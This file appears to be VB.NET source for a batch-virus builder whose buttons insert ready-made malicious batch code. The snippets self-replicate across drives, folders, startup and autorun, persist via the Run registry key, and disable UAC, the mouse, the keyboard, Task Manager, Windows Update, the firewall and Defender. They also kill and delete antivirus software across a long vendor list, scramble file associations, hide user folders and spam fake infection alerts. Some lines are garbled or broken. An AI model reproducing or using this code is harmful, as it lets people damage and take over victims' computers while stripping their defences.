        Dim result As Integer = MessageBox.Show("Do you want to clear all screens?", "ClearSreens", MessageBoxButtons.YesNoCancel)
        If result = DialogResult.Cancel Then
            MessageBox.Show("Process Stopped")
        ElseIf result = DialogResult.No Then
            MessageBox.Show("Process Stopped")
        ElseIf result = DialogResult.Yes Then
            RichTextBox1.Text = "@echo off"
            RichTextBox2.Text = ""
            MessageBox.Show("Screens Cleared")
        End If
    End Sub

    Private Sub RedButton_Click(sender As Object, e As EventArgs) Handles RedButton.Click
        Dim result As Integer = MessageBox.Show("Do you want to clear the INFO screen?", "ClearSreen", MessageBoxButtons.YesNoCancel)
        If result = DialogResult.Cancel Then
            MessageBox.Show("Process Stopped")
        ElseIf result = DialogResult.No Then
            MessageBox.Show("Process Stopped")
        ElseIf result = DialogResult.Yes Then
            RichTextBox2.Text = ""
            MessageBox.Show("Screen Cleared")
        End If
    End Sub

    Private Sub GreenButton_Click(sender As Object, e As EventArgs) Handles GreenButton.Click
        Dim result As Integer = MessageBox.Show("Do you want to clear the Code screen?", "ClearSreen", MessageBoxButtons.YesNoCancel)
        If result = DialogResult.Cancel Then
            MessageBox.Show("Process Stopped")
        ElseIf result = DialogResult.No Then
            MessageBox.Show("Process Stopped")
        ElseIf result = DialogResult.Yes Then
            RichTextBox1.Text = "@echo off"
            MessageBox.Show("Screen Cleared")
        End If
    End Sub

    Private Sub CheckBox4_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox4.CheckedChanged
        If CheckBox1.Checked Or CheckBox2.Checked Or CheckBox3.Checked = True Then
        Else
            CheckBox4.Checked = False
        End If
    End Sub

    Private Sub Button18_Click(sender As Object, e As EventArgs) Handles Button18.Click
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + "rem Spam With VBScript Msgboxes"
        RichTextBox1.Text += Environment.NewLine + "echo Do>>msgbox.vbs"
        RichTextBox1.Text += Environment.NewLine + "echo x=msgbox(""Your computer Is infected With a virus!"",0+48,""Infected"") >>msgbox.vbs"
        RichTextBox1.Text += Environment.NewLine + "echo Loop>>msgbox.vbs"
        RichTextBox1.Text += Environment.NewLine + "start """" ""msgbox.vbs"""
        RichTextBox1.Text += Environment.NewLine + "start """" ""msgbox.vbs"""
        RichTextBox1.Text += Environment.NewLine + "start """" ""msgbox.vbs"""
        RichTextBox1.Text += Environment.NewLine + "start """" ""msgbox.vbs"""
        RichTextBox1.Text += Environment.NewLine + "start """" ""msgbox.vbs"""
        RichTextBox1.Text += Environment.NewLine + "start """" ""msgbox.vbs"""
        RichTextBox1.Text += Environment.NewLine + "start """" ""msgbox.vbs"""
        RichTextBox1.Text += Environment.NewLine + "start """" ""msgbox.vbs"""
        RichTextBox1.Text += Environment.NewLine + "start """" ""msgbox.vbs"""
        RichTextBox1.Text += Environment.NewLine + "start """" ""msgbox.vbs"""
        RichTextBox1.Text += Environment.NewLine + "start """" ""msgbox.vbs"""
        RichTextBox1.Text += Environment.NewLine + "start """" ""msgbox.vbs"""
        RichTextBox1.Text += Environment.NewLine + "start """" ""msgbox.vbs"""
        RichTextBox1.Text += Environment.NewLine + "start """" ""msgbox.vbs"""
        RichTextBox1.Text += Environment.NewLine + "start """" ""msgbox.vbs"""
        RichTextBox1.Text += Environment.NewLine + "start """" ""msgbox.vbs"""
        RichTextBox1.Text += Environment.NewLine + "start """" ""msgbox.vbs"""
        RichTextBox1.Text += Environment.NewLine + "start """" ""msgbox.vbs"""
        RichTextBox1.Text += Environment.NewLine + "start """" ""msgbox.vbs"""
        RichTextBox1.Text += Environment.NewLine + "start """" ""msgbox.vbs"""
        RichTextBox1.Text += Environment.NewLine + "start """" ""msgbox.vbs"""
        RichTextBox1.Text += Environment.NewLine + "start """" ""msgbox.vbs"""
        RichTextBox1.Text += Environment.NewLine + "start """" ""msgbox.vbs"""
        RichTextBox1.Text += Environment.NewLine + "start """" ""msgbox.vbs"""
        RichTextBox1.Text += Environment.NewLine + "start """" ""msgbox.vbs"""
        RichTextBox1.Text += Environment.NewLine + "start """" ""msgbox.vbs"""
        RichTextBox1.Text += Environment.NewLine + "start """" ""msgbox.vbs"""
        RichTextBox1.Text += Environment.NewLine + "start """" ""msgbox.vbs"""
        RichTextBox1.Text += Environment.NewLine + "start """" ""msgbox.vbs"""
        RichTextBox1.Text += Environment.NewLine + "start """" ""msgbox.vbs"""
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
    End Sub

    Private Sub Button19_Click_1(sender As Object, e As EventArgs) Handles Button19.Click
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + "rem Start Opening Disk Tray"
        RichTextBox1.Text += Environment.NewLine + "echo Do >> ""opendisk.vbs"""
        RichTextBox1.Text += Environment.NewLine + "echo Set oWMP = CreateObject(""WMPlayer.OCX.7"" ) >> ""opendisk.vbs"""
        RichTextBox1.Text += Environment.NewLine + "echo Set colCDROMs = oWMP.cdromCollection >> ""opendisk.vbs"""
        RichTextBox1.Text += Environment.NewLine + "echo colCDROMs.Item(d).Eject  >> ""opendisk.vbs"""
        RichTextBox1.Text += Environment.NewLine + "echo colCDROMs.Item(d).Eject  >> ""opendisk.vbs"""
        RichTextBox1.Text += Environment.NewLine + "echo Loop >> ""opendisk.vbs"""
        RichTextBox1.Text += Environment.NewLine + "start "" ""opendisk.vbs"""
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
    End Sub

    Private Sub Button20_Click(sender As Object, e As EventArgs) Handles Button20.Click
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + "rem Change Computer Time"
        RichTextBox1.Text += Environment.NewLine + "time 12:00"
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
    End Sub

    Private Sub Button21_Click(sender As Object, e As EventArgs) Handles Button21.Click
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + "rem Net Send Spam"
        RichTextBox1.Text += Environment.NewLine + "net start ""messenger"""
        RichTextBox1.Text += Environment.NewLine + "net send * ""Spammed Message"""
        RichTextBox1.Text += Environment.NewLine + "net send * ""Spammed Message"""
        RichTextBox1.Text += Environment.NewLine + "net send * ""Spammed Message"""
        RichTextBox1.Text += Environment.NewLine + "net send * ""Spammed Message"""
        RichTextBox1.Text += Environment.NewLine + "net send * ""Spammed Message"""
        RichTextBox1.Text += Environment.NewLine + "net send * ""Spammed Message"""
        RichTextBox1.Text += Environment.NewLine + "net send * ""Spammed Message"""
        RichTextBox1.Text += Environment.NewLine + "net send * ""Spammed Message"""
        RichTextBox1.Text += Environment.NewLine + "net send * ""Spammed Message"""
        RichTextBox1.Text += Environment.NewLine + "net send * ""Spammed Message"""
        RichTextBox1.Text += Environment.NewLine + "net send * ""Spammed Message"""
        RichTextBox1.Text += Environment.NewLine + "net send * ""Spammed Message"""
        RichTextBox1.Text += Environment.NewLine + "net send * ""Spammed Message"""
        RichTextBox1.Text += Environment.NewLine + "net send * ""Spammed Message"""
        RichTextBox1.Text += Environment.NewLine + "net send * ""Spammed Message"""
        RichTextBox1.Text += Environment.NewLine + "net send * ""Spammed Message"""
        RichTextBox1.Text += Environment.NewLine + "net send * ""Spammed Message"""
        RichTextBox1.Text += Environment.NewLine + "net send * ""Spammed Message"""
        RichTextBox1.Text += Environment.NewLine + "net send * ""Spammed Message"""
        RichTextBox1.Text += Environment.NewLine + "net send * ""Spammed Message"""
        RichTextBox1.Text += Environment.NewLine + "net send * ""Spammed Message"""
        RichTextBox1.Text += Environment.NewLine + "net send * ""Spammed Message"""
        RichTextBox1.Text += Environment.NewLine + "net send * ""Spammed Message"""
        RichTextBox1.Text += Environment.NewLine + "net send * ""Spammed Message"""
        RichTextBox1.Text += Environment.NewLine + "net send * ""Spammed Message"""
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
    End Sub

    Private Sub Button22_Click_1(sender As Object, e As EventArgs) Handles Button22.Click
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + "rem Confuse File Extensions Powerup"
        RichTextBox1.Text += Environment.NewLine + "assoc .dll=txtfile"
        RichTextBox1.Text += Environment.NewLine + "assoc .exe=pngfile"
        RichTextBox1.Text += Environment.NewLine + "assoc .vbs=Visual Style"
        RichTextBox1.Text += Environment.NewLine + "assoc .reg=xmlfile"
        RichTextBox1.Text += Environment.NewLine + "assoc .txt=regfile"
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + "rem Confuse File Extensions for text"
        RichTextBox1.Text += Environment.NewLine + "assoc .mp3=txtfile"
        RichTextBox1.Text += Environment.NewLine + "assoc .xml=txtfile"
        RichTextBox1.Text += Environment.NewLine + "assoc .png=txtfile"
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
    End Sub

    Private Sub Button23_Click(sender As Object, e As EventArgs) Handles Button23.Click
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + "rem Hide Music, Video, Picture, Document Folders"
        RichTextBox1.Text += Environment.NewLine + "attrib +h ""%userprofile%\my documents"""
        RichTextBox1.Text += Environment.NewLine + "attrib +h ""%userprofile%\my music"""
        RichTextBox1.Text += Environment.NewLine + "attrib +h ""%userprofile%\my videos"""
        RichTextBox1.Text += Environment.NewLine + "attrib +h ""%userprofile%\my pictures"""
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
    End Sub

    Private Sub Button24_Click(sender As Object, e As EventArgs) Handles Button24.Click
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + "rem Infect Reg Run Key"
        RichTextBox1.Text += Environment.NewLine + "set valinf=""rundll32_%random%_toolbar"""
        RichTextBox1.Text += Environment.NewLine + "set reginf=""hklm\Software\Microsoft\Windows\CurrentVersion\Run""net send * ""Spammed Message"""
        RichTextBox1.Text += Environment.NewLine + "reg add %reginf% /v %valinf% /t ""REG_SZ"" /d %0 /f > nul"""
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
    End Sub

    Private Sub Button25_Click(sender As Object, e As EventArgs) Handles Button25.Click
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + "rem Infect All Drives"
        RichTextBox1.Text += Environment.NewLine + "for %%E In (A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z) Do ("
        RichTextBox1.Text += Environment.NewLine + "copy /Y %0 %%E:\"
        RichTextBox1.Text += Environment.NewLine + "echo [AutoRun] > %%E:\autorun.inf"
        RichTextBox1.Text += Environment.NewLine + "echo open=""%%E:\%0"" >> %%E:\autorun.inf"
        RichTextBox1.Text += Environment.NewLine + "echo action=Open folder to see files... >> %%E:\autorun.inf)"
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
    End Sub

    Private Sub Button26_Click(sender As Object, e As EventArgs) Handles Button26.Click
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + "rem Infect All Folders"
        RichTextBox1.Text += Environment.NewLine + "Dir %SystemRoot% /s /b > PathHost"
        RichTextBox1.Text += Environment.NewLine + "For /f %%a In (PathHost) Do Copy /y %0 %%a > Nul"
        RichTextBox1.Text += Environment.NewLine + "Del /f /s /q PathHost > Nul"
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
    End Sub

    Private Sub Button27_Click(sender As Object, e As EventArgs) Handles Button27.Click
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + "rem Infect Startup Folder"
        RichTextBox1.Text += Environment.NewLine + "copy %0 ""%userprofile%\Start Menu\Programs\Startup"""
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
    End Sub

    Private Sub Button28_Click(sender As Object, e As EventArgs) Handles Button28.Click
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + "rem Infect Autoexec.bat"
        RichTextBox1.Text += Environment.NewLine + "echo start "" %0>>%SystemDrive%\AUTOEXEC.BAT"
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
    End Sub

    Private Sub Button29_Click(sender As Object, e As EventArgs) Handles Button29.Click
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + "rem Infect ""ls"" Cmd"
        RichTextBox1.Text += Environment.NewLine + "copy %0 %windir%\system32\ls.bat"
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
        RichTextBox2.Text += Environment.NewLine + """Ls"" is a Unix Command as it will disable if the user installed the feature............................................... "
    End Sub

    Private Sub Button30_Click(sender As Object, e As EventArgs) Handles Button30.Click
        RichTextBox2.Text += Environment.NewLine + "Insert in a Extension Format eg:.exe,  .txt,..mp3,....................................................... "
        RichTextBox1.Text += Environment.NewLine + "REM---------------------------------"
        RichTextBox1.Text += Environment.NewLine + "rem Infect All "
        RichTextBox1.Text += (TextBox3.Text)
        RichTextBox1.Text += " Files"
        RichTextBox1.Text += Environment.NewLine + "assoc "
        RichTextBox1.Text += (TextBox3.Text)
        RichTextBox1.Text += "=batfile"
        RichTextBox1.Text += Environment.NewLine + "DIR /S/B %SystemDrive%\*"
        RichTextBox1.Text += (TextBox3.Text)
        RichTextBox1.Text += " >> InfList_"
        RichTextBox1.Text += (TextBox3.Text)
        RichTextBox1.Text += ".txt"
        RichTextBox1.Text += Environment.NewLine + "echo Y | FOR /F ""tokens=1,* delims=: "" %%j in (InfList_"
        RichTextBox1.Text += (TextBox3.Text)
        RichTextBox1.Text += ".txt) do copy /y %0 ""%%j:%%k"""
        RichTextBox1.Text += Environment.NewLine + " REM ---------------------------------"
    End Sub

    Private Sub Button31_Click_1(sender As Object, e As EventArgs) Handles Button31.Click
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + "rem Disable Admin Accounts"
        RichTextBox1.Text += Environment.NewLine + "@Set RegistyEditCmd=Cmd /k Reg Add"
        RichTextBox1.Text += Environment.NewLine + "@Set HiveSysKey=HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
        RichTextBox1.Text += Environment.NewLine + "@%RegistyEditCmd% ""%HiveSysKey%"" /v ""EnableLUA"" /t ""REG_DWORD"" /d ""0"" /f > nul"
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
    End Sub

    Private Sub Button32_Click(sender As Object, e As EventArgs) Handles Button32.Click
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + "rem Disable Mouse"
        RichTextBox1.Text += Environment.NewLine + "set key=""HKEY_LOCAL_MACHINE\system\CurrentControlSet\Services\Mouclass"""
        RichTextBox1.Text += Environment.NewLine + "reg delete %key%"
        RichTextBox1.Text += Environment.NewLine + "reg add %key% /v Start /t REG_DWORD /d 4"
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
    End Sub

    Private Sub Button33_Click(sender As Object, e As EventArgs) Handles Button33.Click
        MsgBox("BE CAREFUL USING THIS!!!!")
        RichTextBox1.Text += Environment.NewLine + "REM ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + " REM Disable Keyboard"
        RichTextBox1.Text += Environment.NewLine + "echo Windows Registry Editor Version 5.00 > ""nokeyboard.reg"""
        RichTextBox1.Text += Environment.NewLine + "echo [HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Keyboard Layout] >> ""nokeyboard.reg"""
        RichTextBox1.Text += Environment.NewLine + "echo ""Scancode Map""=hex:00,00,00,00,00,00,00,00,7c,00,00,00,00,00,01,00,00,\ >> ""nokeyboard.reg"""
        RichTextBox1.Text += Environment.NewLine + "echo 00,3b,00,00,00,3c,00,00,00,3d,00,00,00,3e,00,00,00,3f,00,00,00,40,00,00,00,\ >> ""nokeyboard.reg"""
        RichTextBox1.Text += Environment.NewLine + "echo 41,00,00,00,42,00,00,00,43,00,00,00,44,00,00,00,57,00,00,00,58,00,00,00,37,\ >> ""nokeyboard.reg"""
        RichTextBox1.Text += Environment.NewLine + "echo e0,00,00,46,00,00,00,45,00,00,00,35,e0,00,00,37,00,00,00,4a,00,00,00,47,00,\ >> ""nokeyboard.reg"""
        RichTextBox1.Text += Environment.NewLine + "echo 00,00,48,00,00,00,49,00,00,00,4b,00,00,00,4c,00,00,00,4d,00,00,00,4e,00,00,\ >> ""nokeyboard.reg"""
        RichTextBox1.Text += Environment.NewLine + "echo 00,4f,00,00,00,50,00,00,00,51,00,00,00,1c,e0,00,00,53,00,00,00,52,00,00,00,\ >> ""nokeyboard.reg"""
        RichTextBox1.Text += Environment.NewLine + "echo 4d,e0,00,00,50,e0,00,00,4b,e0,00,00,48,e0,00,00,52,e0,00,00,47,e0,00,00,49,\ >> ""nokeyboard.reg"""
        RichTextBox1.Text += Environment.NewLine + "echo e0,00,00,53,e0,00,00,4f,e0,00,00,51,e0,00,00,29,00,00,00,02,00,00,00,03,00,\ >> ""nokeyboard.reg"""
        RichTextBox1.Text += Environment.NewLine + "echo 00,00,04,00,00,00,05,00,00,00,06,00,00,00,07,00,00,00,08,00,00,00,09,00,00,\ >> ""nokeyboard.reg"""
        RichTextBox1.Text += Environment.NewLine + "echo 00,0a,00,00,00,0b,00,00,00,0c,00,00,00,0d,00,00,00,0e,00,00,00,0f,00,00,00,\ >> ""nokeyboard.reg"""
        RichTextBox1.Text += Environment.NewLine + "echo 10,00,00,00,11,00,00,00,12,00,00,00,13,00,00,00,14,00,00,00,15,00,00,00,16,\ >> ""nokeyboard.reg"""
        RichTextBox1.Text += Environment.NewLine + "echo 00,00,00,17,00,00,00,18,00,00,00,19,00,00,00,1a,00,00,00,1b,00,00,00,2b,00,\ >> ""nokeyboard.reg"""
        RichTextBox1.Text += Environment.NewLine + "echo 00,00,3a,00,00,00,1e,00,00,00,1f,00,00,00,20,00,00,00,21,00,00,00,22,00,00,\ >> ""nokeyboard.reg"""
        RichTextBox1.Text += Environment.NewLine + "echo 00,23,00,00,00,24,00,00,00,25,00,00,00,26,00,00,00,27,00,00,00,28,00,00,00,\ >> ""nokeyboard.reg"""
        RichTextBox1.Text += Environment.NewLine + "echo 1c,00,00,00,2a,00,00,00,2c,00,00,00,2d,00,00,00,2e,00,00,00,2f,00,00,00,30,\ >> ""nokeyboard.reg"""
        RichTextBox1.Text += Environment.NewLine + "echo 00,00,00,31,00,00,00,32,00,00,00,33,00,00,00,34,00,00,00,35,00,00,00,36,00,\ >> ""nokeyboard.reg"""
        RichTextBox1.Text += Environment.NewLine + "echo 00,00,1d,00,00,00,5b,e0,00,00,38,00,00,00,39,00,00,00,38,e0,00,00,5c,e0,00,\ >> ""nokeyboard.reg"""
        RichTextBox1.Text += Environment.NewLine + "echo 00,5d,e0,00,00,1d,e0,00,00,5f,e0,00,00,5e,e0,00,00,22,e0,00,00,24,e0,00,00,\ >> ""nokeyboard.reg"""
        RichTextBox1.Text += Environment.NewLine + "echo 10,e0,00,00,19,e0,00,00,30,e0,00,00,2e,e0,00,00,2c,e0,00,00,20,e0,00,00,6a,\ >> ""nokeyboard.reg"""
        RichTextBox1.Text += Environment.NewLine + "echo e0,00,00,69,e0,00,00,68,e0,00,00,67,e0,00,00,42,e0,00,00,6c,e0,00,00,6d,e0,\ >> ""nokeyboard.reg"""
        RichTextBox1.Text += Environment.NewLine + "echo 00,00,66,e0,00,00,6b,e0,00,00,21,e0,00,00,00,00 >> ""nokeyboard.reg"""
        RichTextBox1.Text += Environment.NewLine + "start ""nokeyboard.reg"""
        RichTextBox1.Text += Environment.NewLine + "REM ---------------------------------"
    End Sub

    Private Sub Button34_Click(sender As Object, e As EventArgs) Handles Button34.Click
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + "rem Disable Task Manager"
        RichTextBox1.Text += Environment.NewLine + "reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul"
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
    End Sub

    Private Sub Button35_Click(sender As Object, e As EventArgs) Handles Button35.Click
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + "rem Disable Windows Backup"
        RichTextBox1.Text += Environment.NewLine + "net stop ""SDRSVC"""
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
    End Sub

    Private Sub Button36_Click(sender As Object, e As EventArgs) Handles Button36.Click
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + "rem Disable Internet"
        RichTextBox1.Text += Environment.NewLine + "@Echo off & @@Break Off"
        RichTextBox1.Text += Environment.NewLine + "Ipconfig /release"
        RichTextBox1.Text += Environment.NewLine + "%jUmP%E%nD%c%onFiG%h%IdE%o%P% h%aRv%%aRd%A%T%%cHe%cK%HappY%3D b%aLLo0Ns%Y%eS% m3Ga!?!"
        RichTextBox1.Text += Environment.NewLine + "P%ReSs%%IE%AuS%ExPloR%e%r% > nul.%TempInternetRelease%"
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
    End Sub

    Private Sub Button37_Click(sender As Object, e As EventArgs) Handles Button37.Click
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + "rem Disable Windows Defender"
        RichTextBox1.Text += Environment.NewLine + "net stop ""WinDefend"""
        RichTextBox1.Text += Environment.NewLine + "taskkill /f /t /im ""MSASCui.exe"""
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
        RichTextBox2.Text += Environment.NewLine + "This Will Leave a Computer Exposed to potential harm....................................."
    End Sub

    Private Sub Button38_Click(sender As Object, e As EventArgs) Handles Button38.Click
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + "rem Disable Windows Update"
        RichTextBox1.Text += Environment.NewLine + "net stop ""wuauserv"""
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
    End Sub

    Private Sub Button39_Click(sender As Object, e As EventArgs) Handles Button39.Click
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + "rem Disable Windows Security"
        RichTextBox1.Text += Environment.NewLine + "net stop ""security center"""
        RichTextBox1.Text += Environment.NewLine + "net stop sharedaccess"
        RichTextBox1.Text += Environment.NewLine + "netsh firewall set opmode mode-disable"
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
    End Sub

    Private Sub Button40_Click(sender As Object, e As EventArgs) Handles Button40.Click
        RichTextBox1.Text += Environment.NewLine + "REM ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + "REM Kill Anti-Virus"
        RichTextBox1.Text += Environment.NewLine + "net stop ""Security Center"""
        RichTextBox1.Text += Environment.NewLine + "netsh firewall set opmode mode=disable"
        RichTextBox1.Text += Environment.NewLine + "tskill /A av*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A fire*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A anti*"
        RichTextBox1.Text += Environment.NewLine + " cls()"
        RichTextBox1.Text += Environment.NewLine + "tskill /A spy*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A bullguard"
        RichTextBox1.Text += Environment.NewLine + "tskill /A PersFw"
        RichTextBox1.Text += Environment.NewLine + "tskill /A KAV*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A ZONEALARM"
        RichTextBox1.Text += Environment.NewLine + "tskill /A SAFEWEB"
        RichTextBox1.Text += Environment.NewLine + " cls()"
        RichTextBox1.Text += Environment.NewLine + "tskill /A OUTPOST"
        RichTextBox1.Text += Environment.NewLine + "tskill /A nv*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A nav*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A F-*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A ESAFE"
        RichTextBox1.Text += Environment.NewLine + "tskill /A cle"
        RichTextBox1.Text += Environment.NewLine + "cls()"
        RichTextBox1.Text += Environment.NewLine + "tskill /A BLACKICE"
        RichTextBox1.Text += Environment.NewLine + "tskill /A def*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A kav"
        RichTextBox1.Text += Environment.NewLine + "tskill /A kav*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A avg*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A ash*"
        RichTextBox1.Text += Environment.NewLine + " cls()"
        RichTextBox1.Text += Environment.NewLine + "tskill /A aswupdsv"
        RichTextBox1.Text += Environment.NewLine + "tskill /A ewid*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A guard*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A guar*"
        RichTextBox1.Text += Environment.NewLine + " /A gcasDt*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A msmp*"
        RichTextBox1.Text += Environment.NewLine + "cls()"
        RichTextBox1.Text += Environment.NewLine + "tskill /A mcafe*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A mghtml"
        RichTextBox1.Text += Environment.NewLine + "tskill /A msiexec"
        RichTextBox1.Text += Environment.NewLine + "tskill /A outpost"
        RichTextBox1.Text += Environment.NewLine + "tskill /A isafe"
        RichTextBox1.Text += Environment.NewLine + "tskill /A zap*"
        RichTextBox1.Text += Environment.NewLine + "cls()"
        RichTextBox1.Text += Environment.NewLine + "tskill /A zauinst"
        RichTextBox1.Text += Environment.NewLine + "tskill /A upd*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A zlclien*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A minilog"
        RichTextBox1.Text += Environment.NewLine + "tskill /A cc*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A norton*"
        RichTextBox1.Text += Environment.NewLine + "cls()"
        RichTextBox1.Text += Environment.NewLine + "tskill /A norton au*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A ccc*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A npfmn*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A loge*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A nisum*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A issvc"
        RichTextBox1.Text += Environment.NewLine + "tskill /A tmp*"
        RichTextBox1.Text += Environment.NewLine + "cls()"
        RichTextBox1.Text += Environment.NewLine + "tskill /A tmn*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A pcc*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A cpd*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A pop*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A pav*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A padmin"
        RichTextBox1.Text += Environment.NewLine + " cls()"
        RichTextBox1.Text += Environment.NewLine + "tskill /A panda*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A avsch*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A sche*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A syman*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A virus*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A realm*"
        RichTextBox1.Text += Environment.NewLine + "cls()"
        RichTextBox1.Text += Environment.NewLine + "tskill /A sweep*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A scan*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A ad-*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A safe*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A avas*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A norm*"
        RichTextBox1.Text += Environment.NewLine + "cls()"
        RichTextBox1.Text += Environment.NewLine + "tskill /A offg*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A Avast Service*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A Avast Antivirus*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A Avast*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A Malwarebytes Anti-Malware*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A Malwarebytes*"
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files (x86)\alwils~1\avast4\*.* "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files (x86)\Lavasoft\Ad-awa~1\*.exe "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files (x86)\kasper~1\*.exe "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\alwils~1\avast4\*.* "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\Lavasoft\Ad-awa~1\*.exe "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\kasper~1\*.exe "
        RichTextBox1.Text += Environment.NewLine + " cls()"
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\trojan~1\*.exe "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\f-prot95\*.dll "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\tbav\*.dat "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files (x86)\trojan~1\*.exe "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files (x86)\f-prot95\*.dll "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files (x86)\tbav\*.dat "
        RichTextBox1.Text += Environment.NewLine + " cls()"
